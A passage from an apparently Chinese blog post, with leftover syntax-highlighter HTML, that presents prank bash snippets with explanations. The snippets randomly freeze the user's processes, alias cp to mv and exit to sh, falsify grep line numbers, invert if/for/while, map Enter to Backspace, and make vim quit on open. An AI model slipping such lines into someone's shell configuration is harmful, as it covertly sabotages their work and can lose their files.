class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsleep $[ ( $RANDOM % 100 )  + 1 ]s &amp;&amp; kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &amp;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b10e03b3a3198759800-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b10e03b3a3198759800-1\"><span class=\"crayon-i\">sleep</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">RANDOM</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-v\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">kill</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">STOP</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">ps</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pid</span><span class=\"crayon-o\">|</span><span class=\"crayon-i\">sed</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1d</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">sort</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">R</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">head</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p></p>\n<blockquote><p>学习课题：</p>\n<p><code>sleep</code> 就不用解释了，这代表暂停若干秒。</p>\n<p>通过上述 <code>ps</code> 命令会会随机选出（<code>sort</code> 命令的 <code>-R</code> 选项）一个你的进程号，然后由 <code>kill</code> 命令发送 <code>STOP</code> 信号给它。<code>STOP</code> 信息会使程序被停止（冻结、挂起），在命令行中可有 <code>CTRL-Z</code> 发出，被停止的进程可以通过 <code>bg</code> 放到后台运行，也可以由 <code>fg</code> 带回到前台。</p></blockquote>\n<h4 id=\"toc_13\">一个还是两个？</h4>\n<p>当我想复制一个文件到另外一个地方时，咦？原来的那个哪里去了？</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b10e03b3a7037282515\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalias cp='mv';</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b10e03b3a7037282515-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b10e03b3a7037282515-1\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">cp</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'mv'</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>还好，还好，你总是还有一个副本的，这总算是不幸中的大幸了。</p>\n<blockquote><p>学习课堂：</p>\n<p><code>cp</code> 是 <code>mv</code>，<code>mv</code> 还是 <code>mv</code>。</p></blockquote>\n<h4 id=\"toc_14\">永不停止的工作</h4>\n<p>打完收工，你总是要退出（<code>exit</code>）你的 shell 的，但是一直退不出是什么意思？</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b10e03b3aa201289599\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalias exit='sh';</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b10e03b3aa201289599-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b10e03b3aa201289599-1\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">exit</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'sh'</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<blockquote><p>学习课堂：</p>\n<p>将 <code>exit</code> 命令别名为 <code>sh</code> ，这样输入 <code>exit</code> 命令后不是退出当前 shell，而是有进入了一个新的子 shell，想退出不干？没门！</p></blockquote>\n<h4 id=\"toc_15\">到底是哪行？</h4>\n<p>会用 <code>grep</code> 的你，应该知道 <code>-n</code> 参数可以告诉你所匹配的行的行号，但是随机乱变的行号是什么鬼？我讨厌随机！</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b10e03b3ae997318748\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfunction grep { command grep \"$@\" | awk -F: '{ r = int(rand() * 10); n = $1; $1 = \"\"; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o \":\" substr($0, 2)}'; }</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b10e03b3ae997318748-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b10e03b3ae997318748-1\"><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">command </span><span class=\"crayon-i\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"$@\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">F</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'{ r = int(rand() * 10); n = $1; $1 = \"\"; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o \":\" substr($0, 2)}'</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p></p>\n<blockquote><p><code>grep</code> 命令的 <code>-n</code> 用于输出匹配的行的行号，上述函数将 <code>grep</code> 定义为一个输出的行号完全不可预测的程序。</p></blockquote>\n<h4 id=\"toc_16\">世界是反着的</h4>\n<p>你脚本也总是出各种匪夷所思的问题，而且你还不知道什么地方出了问题。这一切都要怪你进入了一个“是”即是“非”的世界。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b10e03b3b1086975973\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalias if='if !' for='for !' while='while !';</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b10e03b3b1086975973-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b10e03b3b1086975973-1\"><span class=\"crayon-e\">alias </span><span class=\"crayon-st\">if</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'if !'</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">for</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'for !'</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">while</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'while !'</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>将 <code>if</code>、<code>for</code> 和 <code>while</code> 所检测的条件定义为反，我不知道这个世界可以疯狂到这个地步！</p>\n<blockquote><p>学习课堂：</p>\n<p><code>if</code> 、<code>for</code> 和 <code>while</code> 是用于 shell 脚本中做逻辑判断和循环的语句，<code>!</code> 表示对表达式逻辑取反。</p></blockquote>\n<h4 id=\"toc_17\">想执行命令？没门！</h4>\n<p>当你输入了一个命令之后，用小指轻轻地、优雅地，按下右侧的那个小小的回车键，满心以为会爆发出绝世高手的风范。然而……并没有，非但没有，你输入的命令还被删除了一个字符！懵逼的你以为用力太轻了，再次敲击后发现又被删除了一个！！！</p>\n<blockquote><p>记得有一个电影，危急情况下，当别人把键盘递给一位即将闭眼的黑客时，他只是轻轻按下了那个“回车”！</p></blockquote>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b10e03b3b5218284103\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nbind '\"\\C-J\":\"\\C-?\"';\r\nbind '\"\\C-M\":\"\\C-?\"';</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b10e03b3b5218284103-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b10e03b3b5218284103-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b10e03b3b5218284103-1\"><span class=\"crayon-i\">bind</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'\"\\C-J\":\"\\C-?\"'</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b10e03b3b5218284103-2\"><span class=\"crayon-i\">bind</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'\"\\C-M\":\"\\C-?\"'</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<blockquote><p>学习课堂：</p>\n<p><code>bind</code> 用于显示和设置键盘序列绑定，<code>C-J</code> 代表 <code>CTRL-J</code>，所触发的 ASCII 码是 <code>0x0A</code>，即“换行”；<code>C-M</code> 代表 <code>CTRL-M</code>，所触发的 ASCII 码是 <code>0x0D</code>，即“回车”；<code>C-?</code> 代表 <code>CTRL-?</code>，所触发的 ASCII 码是 <code>0x7F</code>，即“退格”。也就是说，你按下的回车键，会被映射为退格键。关于 ASCII 控制字符，可参见： <a href=\"http://ascii-table.com/control-chars.php\">http://ascii-table.com/control-chars.php</a> 。也可以使用 <code>showkey -a</code> 命令来检验你按下的键的键值（<code>CTRL-D</code> 退出）。</p></blockquote>\n<h4 id=\"toc_18\">好的，但是我不干</h4>\n<p>你说要，但是你的身体却说不要。明明应该应答 <code>yes</code>，但是却实际上拒绝了。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b10e03b3b9072570589\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalias yes=\"yes n\";</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b10e03b3b9072570589-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b10e03b3b9072570589-1\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">yes</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"yes n\"</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<blockquote><p>学习课堂：</p>\n<p><code>yes</code> 命令常用于脚本中应答 <code>y</code>，但是这里重定义了 <code>yes</code> 的结果。这是身口不一么？</p></blockquote>\n<h4 id=\"toc_19\">我要编辑文件</h4>\n<p>当我用 vim 打开一个文件时，为什么什么都没发生？</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b10e03b3bc029641851\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalias vim=\"vim +q\";</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b10e03b3bc029641851-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b10e03b3bc029641851-1\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">vim</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"vim +q\"</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<blockquote><p>学习课堂：</p>\n<p><code>vim</code> 可以用 <code>+</code> 来跟上要在 <code>vim</code> 里面执行的命令，这里 <code>+q</code> 表示退出 <code>vim</code>。</p></blockquote>\n<h4 id=\"toc_20\">最后，别想回到正常的世界</h4>\n<p>好吧，我明白了，都是 <code>alias</code> 捣的鬼，我要取消它们。什么？取消也无效了？</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b10e03b3bf735342376\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span 